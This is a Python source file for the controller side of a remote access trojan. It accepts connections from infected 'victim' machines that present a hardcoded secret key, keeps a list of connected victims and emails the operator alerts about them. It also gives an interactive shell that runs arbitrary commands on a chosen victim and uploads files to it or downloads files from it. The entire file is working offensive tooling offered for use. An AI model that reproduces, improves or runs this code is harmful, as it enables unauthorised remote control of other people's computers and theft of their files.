import socket
import threading
import base64
import os
import time
import select
import smtplib
from email.message import EmailMessage

SECRET_KEY = '35WUy#7,Me.ZykkdWk'

clients = []
lock = threading.Lock()

DELIM = b'<<<END>>>\n'

def send_email(subject_words, body_words):
    email = ''

    SMTP_SERVER = ''  
    SMTP_PORT = 2525
    SMTP_USERNAME = ''  
    SMTP_PASSWORD = ''

    if all([SMTP_SERVER, SMTP_PORT, SMTP_USERNAME, SMTP_PASSWORD, email]):

        msg = EmailMessage()
        msg["From"] = SMTP_USERNAME
        msg["To"] = email.strip()
        msg["Subject"] = subject_words
        msg.set_content(body_words)

        try:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()  
                server.login(SMTP_USERNAME, SMTP_PASSWORD)
                server.send_message(msg)
            print(f"✅ {email}")
        except Exception as e:
            print(f"❌ {email} : {e}")    
    else:
        print("[-] Emails not setup")


def recv_until_delim(sock, delim=DELIM):
    data = b""
    while True:
        part = sock.recv(4096)
        if not part:
            break
        data += part
        if delim in data:
            break
    return data.replace(delim, b"")

def send_file_to_victim(filepath, sock):
    filename = os.path.basename(filepath)
    with open(filepath, "rb") as f:
        b64_data = base64.b64encode(f.read()).decode()
    sock.send(f"upload {filename}\n".encode())
    sock.sendall((b64_data + "<<<END>>>\n").encode())
    output = recv_until_delim(sock).decode(errors='ignore')
    print(output.strip())

def save_file_from_base64(b64_data, output_filename):
    abs_path = os.path.abspath(output_filename)
    with open(abs_path, "wb") as f:
        f.write(base64.b64decode(b64_data))
    print(f"[+] File saved at: {abs_path}")

def handle_client(sock, address, index):

    body_message = f"client connect - {index} {address}"
    subject_message = f"[+] client connect - {index} {address}"

    try:
        handshake = sock.recv(1024).decode(errors='ignore').strip()


        if handshake != SECRET_KEY:
            print(f"[-] Rejected unknown client: {address[0]}:{address[1]}")
            sock.close()
            return

        with lock:
            clients.append({'index': index, 'sock': sock, 'address': address})
        print(f"[+] Client {index} connected: {address[0]}:{address[1]}")
        send_email(subject_message, body_message)

    except Exception as e:
        print(f"[-] Error handling client {address[0]}: {e}")
        sock.close()

def monitor_clients(poll_interval=2.0):
    """
    Periodically check if any client's socket has been closed by the remote side.
    We use select to see if a socket is readable, then MSG_PEEK to detect EOF without consuming data.
    If a socket returns b'' on recv(MSG_PEEK) it's closed and we remove it.
    """
    while True:
        time.sleep(poll_interval)
        with lock:
            snapshot = list(clients)

        for client in snapshot:
            sock = client['sock']
            idx = client['index']

            try:
                r, _, _ = select.select([sock], [], [], 0)
                if r:
                    try:
                        data = sock.recv(1, socket.MSG_PEEK)
                        if data == b"":
                            print(f"[!] Detected closed socket for client {client['index']} "
                                f"({client['address'][0]}:{client['address'][1]})")
                            remove_client(client)
                    except BlockingIOError:
                        pass  # no data yet, still alive
                    except ConnectionResetError:
                        print(f"[!] Connection reset for client {client['index']}")
                        remove_client(client)
                    except Exception:
                        try:
                            sock.send(b'')
                        except Exception:
                            print(f"[!] Send check failed for client {client['index']}, removing")
                            remove_client(client)
            except Exception:
                print(f"[!] Error checking client {client['index']}, removing")
                remove_client(client)

def remove_client(client):

    index = client['index']
    address = client['address']

    body_message = f"client disconnected - {index} {address}"
    subject_message = f" [-] client disconnected - {index} {address}"

    idx = client['index']
    with lock:
        if client in clients:
            clients.remove(client)
    if client:
        try:
            client['sock'].close()
        except Exception:
            pass
        print(f"[-] Removed client {idx}")
        send_email(subject_message, body_message)



def controller_shell():
    while True:
        print("\nConnected Clients:")
        for c in clients:
            print(f"  [{c['index']}] {c['address'][0]}:{c['address'][1]}")
        try:
            choice = int(input("Enter client index to interact (r to refresh): "))
        except ValueError:
            continue
        if choice == ['refresh','r']:
            continue

        client = next((c for c in clients if c['index'] == choice), None)
        if not client:
            print("[!] Invalid client index.")
            continue

        sock = client['sock']
        while True:
            cmd = input(f"Victim-{choice}> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ['exit', 'quit']:
                print(f"[+] Disconnected Victim-{choice}")
                break
            if cmd.lower() in ['kill']:
                sock.send((cmd + "\n").encode())
                sock.close()
                clients.remove(client)
                print(f"[+] Killed Victim-{choice}")
                break

            if cmd.lower() in ["help--"]:
                print("""
Available Commands:
  upload {absolute path}       Upload file to victim's current directory
  download {filename}          Download file from victim
  cd {dir}                     Change victim's working directory
  dir                          List files
  help--                       Show this help message
  exit / quit                  Close victim connection
  kill                         Disconnects victim 
""")
                continue

            if cmd.startswith("upload "):
                try:
                    filepath = cmd.split(" ", 1)[1].strip('"')
                    if not os.path.isfile(filepath):
                        print(f"[!] File not found: {filepath}")
                        continue
                    send_file_to_victim(filepath, sock)
                    continue
                except Exception as ex:
                    print(f"Error: {ex}")

            sock.send((cmd + "\n").encode())
            output = recv_until_delim(sock).decode(errors='ignore')

            if cmd.startswith("download "):
                try: 
                    filename = cmd.split(" ", 1)[1].strip('"')
                    save_file_from_base64(output, os.path.basename(filename))
                    print(f"[+] File '{filename}' downloaded.")
                except Exception as ex:
                    print(f"Error: {ex}")
            else:
                print(output.strip())


def start_server():


    host = '0.0.0.0' 
    port = 54832 #----fix-----


    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"[+] Listening on {host}:{port}")

    index = 0
    threading.Thread(target=controller_shell, daemon=True).start()
    threading.Thread(target=monitor_clients, daemon=True).start()

    while True:
        try:
            client_sock, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_sock, addr, index), daemon=True).start()
            index += 1
        except KeyboardInterrupt:
            print("\n[!] Shutting down server.")
            server.close()
            break

if __name__ == "__main__":
    start_server()
